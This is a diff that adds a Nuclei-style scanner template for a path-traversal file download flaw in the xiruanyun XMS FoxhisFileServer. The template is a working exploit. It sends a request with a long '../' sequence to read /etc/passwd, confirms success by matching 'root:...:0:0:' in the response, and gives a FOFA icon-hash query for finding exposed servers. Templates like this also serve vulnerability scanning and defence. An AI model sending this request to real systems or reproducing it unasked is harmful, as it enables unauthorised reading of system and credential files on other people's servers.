@@ -1,0 +1,23 @@
+id: xiruanyun-xms-FoxhisFileServer-download
+
+info:
+  name: xiruanyun-xms-FoxhisFileServer-download
+  author: PokerSec
+  severity: high
+  metadata:
+    fofa-search: icon_hash="1724064468"
+
+requests:
+  - raw:
+      - |-
+        GET /FoxhisFileServer/action?method=download&filename=/..//..//..//..//..//..//..//..//..//..//..//../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+      - type: status
+        status:
+          - 200
